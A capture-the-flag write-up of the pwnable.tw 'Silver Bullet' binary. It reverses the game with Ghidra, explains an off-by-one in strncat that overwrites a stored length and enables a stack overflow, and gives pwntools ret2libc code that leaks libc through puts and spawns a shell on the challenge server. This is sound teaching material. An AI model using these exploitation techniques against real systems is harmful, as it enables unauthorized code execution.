# Silver Bullet (buffer overflow, off-by-one)

Notes:
- binary given
- ASLR enabled
- glibc 2.23 (doesn't matter)

## Enumeration

### Setting lab environment
As always we start with downloading appropriate dynamic linker for provided libc and paching binary so we can easly test it localy. I've described step by step how to do it [here](https://github.com/kscieslinski/CTF/tree/master/pwn/pwnabletw/dubblesort)

```bash
$ ls
silver_bullet ld-2.23.so libc_32.so.6
$ patchelf silver_bullet --set-interpreter ./ld-2.23.so patched 
$ ls
silver_bullet ld-2.23.so libc_32.so.6 patched
$ ldd patched
    linux-gate.so.1 (0xf7fd4000)
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dd5000)
    ./ld-2.23.so => /lib/ld-linux.so.2 (0xf7fd6000)
```

To be fair this wasn't needed as it turns out the vulnerabilities in the task doesn't rely on libc version.

### Reversing binary
After setting lab environment we move to analyzing the binary. 

```bash
$ LD_PRELOAD=$PWD/libc_32.so.6 ./patched
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :1
Give me your description of bullet :Initial bullet description
Your power is : 26
Good luck !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :2
Give me your another description of bullet :New bullet description
Your new power is : 22
Enjoy it !
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :Invalid choice
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :3
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483647
>--------------------------------<
Try to beat it .....
Sorry ... It still alive !!
Give me more power !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :3
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483625
>--------------------------------<
Try to beat it .....
Sorry ... It still alive !!
Give me more power !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :4
Don't give up !
```

Ok, so we enter a simple game. We can either:
- create a bullet
- improve bullet
- fight wolf

Moreover the first action has to be creating a bullet:

```bash
$ LD_PRELOAD=$PWD/libc_32.so.6 ./patched
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :2
You need create the bullet first !
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :3
You need create the bullet first !
Give me more power !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :4
Don't give up !
```

The goal of the game is to kill a Werewolf. The wolf has a huge hp pool and when we fight him, we hit him only for the amount of our actual power. Meaning:
new_wolf_hp = old_wold_hp - user_power

We can use Ghidra to confirm above assumptions:

```c
int beat(char *bullet_desc,int *wolf_stats)
{
  int res;
  
  if (*bullet_desc == '\0') {
    puts("You need create the bullet first !");
    res = 0;
  }
  else {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n",wolf_stats[1]);
    printf(" + HP : %d\n",*wolf_stats);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(1000000);
    *wolf_stats = *wolf_stats - *(int *)(bullet_desc + 0x30);
    if (*wolf_stats < 1) {
      puts("Oh ! You win !!");
      res = 1;
    }
    else {
      puts("Sorry ... It still alive !!");
      res = 0;
    }
  }
  return res;
}
```

So maybe we can just loop and hit wolf over and over again till he dies. Unfortunetely it looks like there is `usleep` function invoked as it takes 1 second to hit a wolf. This means that with power of 20 it would take me like 200 years to kill the wolf :(

Ok so let's check how is the power set initialy:


```c
ssize_t read_input(void *new_bullet_desc,size_t to_read)
{  
  size_t bytes_read = read(0,bullet_desc,to_read);

  if (bullet_desc[bytes_read] == '\n') {
      bullet_desc[bytes_read] = 0;
  }
}

void create_bullet(char *bullet_desc)
{
  size_t bullet_len;
  
  if (bullet_desc[0] == '\0') {
    printf("Give me your description of bullet :",0);
    read_input(bullet_desc,48);
    bullet_len = strlen(bullet_desc);
    printf("Your power is : %u\n",bullet_len);
    bullet_desc[48] = bullet_len;
    puts("Good luck !!");
  }
  else {
    puts("You have been created the Bullet !");
  }
  return;
}
```

Hmm, so the power is just a length of description. And the description cannot be longer then 48 characters. That's very bad information for all fair players. But the interesting operation for us is that the lenght of a description (power) is stored at the end of a bullet_desc array!
Meaning when we provide as an input `some_description` string the memory layout would be:

[S][O][M][E][_][D][E][S][C][R][I][P][T][I][O][N][\x00]...[\x00][16]

Still we cannot overflow the buffer and overwrite the length. But if we check the binary protections we can see that buffer overflow is a right path as there are no canaries enabled:

```bash
$ checksec patched
[*] './patched'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Let's check last function in order to see if we can abuse it somehow:

```c
void power_up(char *old_bullet_desc)
{
  int old_len;
  size_t new_len;
  char new_bullet_desc [48];
  
  memset(new_bullet_desc,0,48);
  if (old_bullet_desc[0] == '\0') { // [0]
    puts("You need create the bullet first !");
  }
  else {
    if (old_bullet_desc[48] < 48) { // [1]
      printf("Give me your another description of bullet :");
      read_input(new_bullet_desc,48 - old_bullet_desc[48]); // [2]
      strncat(old_bullet_desc, 48 - old_bullet_desc[48]); // [3]
      new_len = strlen(new_bullet_desc);
      old_len = old_bullet_desc[48];
      printf("Your new power is : %u\n",old_len + new_len);
      old_bullet_desc[48] = old_len + new_len; // [4]
      puts("Enjoy it !");
    }
    else {
      puts("You can\'t power up any more !");
    }
  }
  return;
}
```

The function:
- [0] starts with checking if bullet has been initialized. If not it exits
- [1] checks if we can increase description size
- [2] reads new part of description. New description lenght + old description lenght must be less or equal to 48
- [3] concatenates new description to old description
- [4] updates description lenght

## Buffer overflow
Can you spot the bug? There is off-by-one vulnerability in the code. Let's say we have created a bullet and entered a power_up function:

```bash
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :1
Give me your description of bullet :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your power is : 47
Good luck !!
```

The bullet_desc layout:

![](img/bullet_desc0.png)

Now let's power_up the bullet:

```bash
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :2
Give me your another description of bullet :B
Your new power is : 1
Enjoy it !
```

Wait? Shouldn't the power be 48 (47 + 1)? It should, let's look what happened:

After 
```c
strncat(old_bullet_desc, 48 - old_bullet_desc[48]);
```

![](img/bullet_desc1.png)

The new description part overflowed and overwrote the stored lenght of old_bullet_desc.

Then the lenghts are calculated.

```c
new_len = strlen(new_bullet_desc); // 1
old_len = old_bullet_desc[48]; // 0!!!
```

And the old_lenght is updated:

```c
old_bullet_desc[48] = old_len + new_len;
```

Leaving the final bullet_desc in such state:

![](img/bullet_desc2.png)

## Exploit
That's amazing. You know why? Well, we now have buffer overflow as we can overflow a buffer by 47 bytes with power_up function. The DEP protection is enabled so we will want to invoke system function from libc. There is one more thing! To return from main function we have to kill the wolf (the return action will only call exit). But this is easy this time as our power will now be some huge number (for ex. if we now call power_up(b'CCC') our power will become: 0x43434304) and it should take like 2-4 seconds to kill the beast!

## Leak libc_base
Unfortunetely we will have to bypass ASLR first, meaning we need to leak some libc address. This can be by using standard technique: calling plt@puts with got@puts as an argument.
This is easy, havning buffer overflow vulnerability we will call power_up with such payload:

```python
payload = b'C' * 7 + p32(e.plt['puts']) + p32(e.symbols['main']) + p32(e.got['puts'])
```

The 'CCCCCCC' is some junk to reach return address. Then we overwrite return address with plt@puts providing a got@puts address as argument. At the end we want to jump back to main as we will want to repeat the whole operation but this time we will call system function.
Let's check if we managed to leak libc_base:

```python
# Leak libc phrase
log.info("Started leak libc phrase...")
create_bullet(b'A' * (BULLET_DESC_SZ - 1))
power_up(b'B')

payload = b'C' * 7 + p32(e.plt['puts']) + p32(e.symbols['main']) + p32(e.got['puts'])
power_up(payload)

kill_beast()
puts = u32(p.recvline()[:-1])
libc_base = puts - libc.symbols['puts']
log.info("[x] Leaked libc_base: " + hex(libc_base))
```

Let's try it:
```bash
$ python exp.py remote
[+] Opening connection to chall.pwnable.tw on port 10103: Done
[*] Started leak libc phrase...
[*] [x] Leaked libc_base: 0xf75e3000
```

Super! So now we just have to repeat the whole proccess as mentioned above and call system('/bin/sh');

```python
# Spawn shell phrase
log.info("Started spawn shell phrase...")
create_bullet(b'A' * (BULLET_DESC_SZ - 1))
power_up(b'B')

payload = b'C' * 7
payload += p32(libc_base + libc.symbols['system']) + b'AAAA' + p32(libc_base + BINSH_OFST)
power_up(payload)

kill_beast()
p.interactive()
```

Let's try it out! [Full exploit](epx.py)

```bash
$ python3 exp.py remote
[+] Opening connection to chall.pwnable.tw on port 10103: Done
[*] Started leak libc phrase...
[*] [x] Leaked libc_base: 0xf75e5000
[*] Started spawn shell phrase...
[*] Switching to interactive mode
$ id
uid=1000(silver_bullet) gid=1000(silver_bullet) groups=1000(silver_bullet)
```

Nice, we just got a shell!
